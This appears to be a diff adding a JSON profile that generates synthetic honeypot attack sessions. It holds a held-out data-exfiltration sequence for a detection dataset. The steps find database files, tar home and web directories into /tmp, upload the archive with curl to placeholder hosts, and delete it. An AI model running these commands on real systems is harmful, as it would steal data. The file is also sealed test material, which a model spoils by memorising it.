@@ -1,0 +1,116 @@
+{
+  "version": "2.3.0-revised+sealed-exfiltration-test",
+  "description": "Revised V2 profiles (2026-11-10, task 12): shared command families across categories to reduce template fingerprints found by reports/v2_feature_leakage_validation/report.md, keeping each category's distinct behaviour. Cowrie-compatible (no ssh/scp, wget only to .example names). No per-profile timing: generator 2.1 uses one category-independent PacingPolicy. Design: docs/profile_redesign_v2.md.",
+  "placeholders": {
+    "ip": [
+      "192.0.2.77",
+      "198.51.100.88",
+      "203.0.113.99",
+      "192.0.2.150"
+    ],
+    "lan_ip": [
+      "192.0.2.5",
+      "192.0.2.12",
+      "198.51.100.10",
+      "203.0.113.8"
+    ],
+    "domain": [
+      "archive.example",
+      "backup-store.example",
+      "upload-node.example"
+    ],
+    "bin": [
+      "b.sh",
+      "malware.sh",
+      "update.sh",
+      "payload"
+    ],
+    "user": [
+      "support",
+      "sysbackup",
+      "ftpuser"
+    ],
+    "dir": [
+      "/tmp",
+      "/var/tmp",
+      "/dev/shm"
+    ]
+  },
+  "profiles": [
+    {
+      "name": "data_exfiltration",
+      "attack_cat": "exfiltration",
+      "label": 1,
+      "held_out": true,
+      "description": "Attempted exfiltration: locate data, stage an archive, attempt an HTTP upload, clean up. Cowrie records the attempt; no transfer succeeds in the isolated lab.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "backup"
+        ],
+        "passwords": [
+          "backup123",
+          "admin2026"
+        ],
+        "failed_attempts": [
+          0,
+          1
+        ]
+      },
+      "steps": [
+        [
+          "find / -name '*.sql' 2>/dev/null",
+          "find /home -name '*.db' 2>/dev/null",
+          "ls -la /home"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "du -sh /home /var/www",
+            "ls -la /var/backups",
+            "df -h"
+          ]
+        },
+        [
+          "tar czf {dir}/d.tgz /home",
+          "tar cf {dir}/d.tar /var/www"
+        ],
+        {
+          "p": 0.8,
+          "cmd": [
+            "curl -T {dir}/d.tgz http://{ip}/u",
+            "curl -T {dir}/d.tgz http://{domain}/u"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "rm -f {dir}/d.tgz {dir}/d.tar"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "id",
+        "ls",
+        "whoami"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    }
+  ],
+  "derived_from": {
+    "file": "dataset_builder/profiles_v2_revised.json",
+    "sha256": "79d47ac48e1f4c242ffcb851c567da884df21d039cc11917dc5bf3dea761fe62",
+    "changes": [
+      "profiles: data_exfiltration only (held_out: true; steps, credentials, noise unchanged)",
+      "placeholders.ip and placeholders.domain replaced by disjoint documentation-only values",
+      "placeholders.dir, lan_ip, bin, user unchanged"
+    ],
+    "task": "Task 19B sealed test run (single approved evaluation)"
+  }
+}
